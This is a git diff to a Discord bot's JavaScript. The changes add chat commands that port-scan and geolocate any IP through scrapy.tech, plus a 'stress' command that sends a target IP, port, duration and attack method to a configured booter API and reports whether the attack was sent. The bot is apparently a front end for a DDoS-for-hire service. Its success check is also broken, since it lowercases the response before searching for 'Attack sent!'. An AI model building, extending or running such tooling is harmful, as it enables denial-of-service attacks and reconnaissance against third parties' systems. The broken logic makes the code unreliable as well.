@@ -4,6 +4,8 @@ const client = new Discord.Client();
 const config = require("./src/config.js");
 const crud = require("./src/crud.js");
 const extra = require("./src/extra.js");
+const lulz = require("./src/boot_management");
+const { resolvePtr } = require('dns');
 
 //Bot on ready.
 
@@ -60,17 +62,16 @@ client.on('message', async (message) => {
       if(message.content == config.BotInfo.Prefix + "geo") {
          sendmsg("Error", "Missing arguments!\nUsage: geo <ip>\nExmaple: geo 5.5.5.5");
       } else {
-        sendmsg("Geo", extra.geo(ip));
-        // fetch("https://scrapy.tech/tools/?action=geoip&q=" + ip).then(res => res.text()).then(body => {
-        //   sendmsg("Geo", body);
-        // });
+        fetch("https://scrapy.tech/tools/?action=geoip&q=" + ip).then(res => res.text()).then(body => {
+          sendmsg("Geo", body);
+        });
       }
-    } else if(message.content.startsWith(config.BotInfo.Prefix + "pscan")) {
+    } else if(message.content.startsWith(config.BotInfo.Prefix + "scan")) {
       ip = config.CurrentMSG.arg[1];
       if(message.content.split(" ").length < 1) {
         sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "pscan <ip>");
       } else {
-        fetch("https://scrapy.tech/tools/?action=pscan&q=" + ip).then(res => res.text()).then(body => {
+        fetch("https://scrapy.tech/tools/?action=portscan&q=" + ip).then(res => res.text()).then(body => {
           sendmsg("Pscan", body);
         });
       }
@@ -92,9 +93,11 @@ client.on('message', async (message) => {
       if(message.content.split(" ").length < 4) {
         sendmsg("Error", "Missing arguments\nUsage: " + config.BotInfo.Prefix + "stress <ip> <port> <time>");
       } else {
-        fetch("api" + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
-          if(body.toLowerCase().includes("attack sent")) {
-            sendmsg("Attack Status", "Sent")
+        fetch(config.BOOTERAPI + ip + "&port=" + port + "&time=" + time + "&method=" + method).then(res => res.text()).then(body => {
+          let resp = body;
+          console.log(body);
+          if(resp.toLowerCase().includes("Attack sent!")) {
+            bootembed(ip, port, time, method, "True", extra.currentTime());
           }
         });
       }
